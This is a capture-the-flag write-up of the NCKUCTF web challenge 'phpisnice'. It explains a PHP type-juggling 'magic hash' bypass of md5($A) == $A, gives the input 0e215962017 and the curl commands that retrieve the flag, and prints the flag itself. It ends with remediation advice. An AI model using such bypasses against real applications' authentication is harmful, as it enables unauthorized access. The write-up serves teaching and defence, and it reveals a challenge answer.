# Phpisnice



{{< admonition tldr "TL;DR" >}}

**phpisnice** is a web challenge from **NCKUCTF**. * **Challenge Name** : phpisnice * **Category** : WEB * **Organizer** : NCKUCTF * **Writeup Author** : spawn2pwn

{{< /admonition >}}

## **1. Identity Challenge**

* **Challenge Name** : phpisnice
* **Category** : WEB
* **Organizer** : NCKUCTF
* **Writeup Writer** : spawn2pwn

---

## **2. Problem Description**

This challenge displays PHP source code directly (*source disclosure*) which contains input validation mechanisms before displaying FLAG. The user is asked to provide the `A` parameter via the GET method.

The objective of this challenge is to find an input value `A` that can pass validation and produce a FLAG.

---

## **3. System Analysis**

Based on the source code shown:

```php id="c8p2lx"
if (isset($A))
    if (md5($A) == $A)
        echo $flag;
    else die('ERROR: MD5(A) != A');
else die('ERROR: Ashould be given');
```

The conditions that must be met are:

```id="v1n9sd"
md5(A) == A
```

Logically, this condition is difficult to fulfill because:

* The `md5()` function produces a hash of 32 hexadecimal characters
* The `A` value is generally not an MD5 hash of itself

However, there are special characteristics in PHP regarding comparisons using the `==` operator.

---

## **4. Identify Vulnerabilities**

The vulnerabilities discovered are:

> **Type of Juggling in PHP (Loose Comparison)**

In PHP:

* The `==` operator performs type conversion implicitly
* Strings in the form of scientific numbers such as `0e12345` will be treated as numbers `0` Example:

```php
"0e12345" == "0e67890"  // true
```

If:

* `md5(A)` produces a string starting with `0e...` * And `A` is also a string with a similar format

Then the comparison will evaluate to **true** even though the values are different strings.

---

## **5. Exploitation Methodology**

### **5.1 Finding Valid Values**

Required input `A` that meets:

* `md5(A)` output format: `0e...` * The value `A` is also of the form `0e...` One of the known values:

```id="g7x2rm"
A = 0e215962017
```

---

### **5.2 Sending Request**

Send a request with these parameters:

```bash id="k9z3fp"
curl -i https://chall.nckuctf.org:28105/?A=0e215962017
```

---

### **5.3 FLAG Extraction**

To retrieve a FLAG directly:

```bash id="x4m8qt"
curl -s https://chall.nckuctf.org:28105/?A=0e215962017 | grep -o "NCKUCTF{.*}"
```

---

## **6. Exploitation Results**

Response indicates that the condition is met and FLAG is displayed:

```id="b8n3dw"
NCKUCTF{php_15_7h3_n1c3_14n9u493}
```

---

## **7. Discussion**

The main problem in this challenge is:

* Use of operator `==` (loose comparison)
* Lack of strict data type validation

As a result:

* Certain strings can be considered numbers
* MD5 hash with format `0e...` can be exploited

This vulnerability is known as:

* **Magic Hash Vulnerability**

---

## **8. Improvement Recommendations**

To prevent this vulnerability:

1. **Use Strict Comparison**

```php
   md5($A) === $A
   ```

2. **Input Validation**

   * Make sure the data types match
   * Avoid direct comparison with user input

3. **Use a Secure Hash Function**

   * Avoid using MD5 for security validation

4. **Implement Additional Validation**

   * Use stronger authentication mechanisms

---

## **9. Conclusion**

This challenge shows that:

> Using loose comparison in PHP can cause validation bypass

By exploiting **type juggling** and the special characteristics of MD5 hashes, attackers can satisfy conditions that seem logically impossible.

---

## **10. Attachments**

### **Source Code**

```php id="y6t2vn"
if (md5($A) == $A)
    echo $flag;
```

### **Exploit Request**

```bash id="p3k7sm"
curl -i https://chall.nckuctf.org:28105/?A=0e215962017
```

### **FLAG Extraction**

```bash id="q8n1xr"
curl -s https://chall.nckuctf.org:28105/?A=0e215962017 | grep -o "NCKUCTF{.*}"
```


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/phpisnice/  

